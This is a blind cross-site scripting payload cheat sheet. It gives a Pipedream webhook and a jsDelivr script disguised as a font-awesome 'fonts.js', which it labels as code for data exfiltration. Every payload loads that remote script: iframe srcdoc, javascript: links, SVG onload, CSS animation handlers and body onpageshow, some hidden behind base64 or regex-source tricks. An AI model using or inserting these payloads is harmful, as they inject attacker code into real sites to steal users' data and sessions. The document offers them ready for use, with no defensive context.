# Blind-XSS via pipedream 

## Configuration

### Pipedream Webhook
```
https://eozpb8qg2g763of.m.pipedream.net
```

### Final Hook URL
Pipedream + GitHub code for data exfiltration:
```
https://cdn.jsdelivr.net/gh/mantapwak/font-awesome-lib/fonts.js
```

---

## Payload Examples

### IFrame Based

**Standard HTML Entities:**
```html
<iframe srcdoc=&lt;svg/onload=import('https://cdn.jsdelivr.net/gh/mantapwak/font-awesome-lib/fonts.js')&gt;></iframe>
```

**Hex Entities:**
```html
<iframe srcdoc=&#x3C;svg/onload=import(&#x27;https://cdn.jsdelivr.net/gh/mantapwak/font-awesome-lib/fonts.js&#x27;)&#x3E;></iframe>
```

---

### Anchor (A href) Based

```html
<a href="javascript:import('https://cdn.jsdelivr.net/gh/mantapwak/font-awesome-lib/fonts.js')">Click Here</a>
```

---

### SVG Based

**Simple onload:**
```html
<svg/onload=import('https://cdn.jsdelivr.net/gh/mantapwak/font-awesome-lib/fonts.js')>
```

**Animation trigger:**
```html
<svg><style>@keyframes x {}</style><a style="animation:x 1s" onanimationstart="import('https://cdn.jsdelivr.net/gh/mantapwak/font-awesome-lib/fonts.js')"></a></svg>
```

**Base64 encoded:**
```html
<svg/onload=eval(atob('aW1wb3J0KCdodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvbWFudGFwd2FrL2ZvbnQtYXdlc29tZS1saWIvZm9udHMuanMnKQ=='))>
```

**Regex source:**
```html
<svg/onload=import(/https:\/\/cdn.jsdelivr.net\/gh\/mantapwak\/font-awesome-lib\/fonts.js/.source)>
```

---

### CSS Based

**Custom element with animation:**
```html
<style>@keyframes x{}</style>
<xss style="animation-name:x" onanimationstart="import('https://cdn.jsdelivr.net/gh/mantapwak/font-awesome-lib/fonts.js')"></xss>
```

**Anchor element with base64:**
```html
<style>@keyframes x{}</style>
<a style="animation-name:x" onanimationstart=eval(atob('aW1wb3J0KCdodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvbWFudGFwd2FrL2ZvbnQtYXdlc29tZS1saWIvZm9udHMuanMnKQ=='))></a>
```

---

### Body Based

```html
<body onpageshow="eval(atob('aW1wb3J0KCdodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvbWFudGFwd2FrL2ZvbnQtYXdlc29tZS1saWIvZm9udHMuanMnKQ=='))">
```

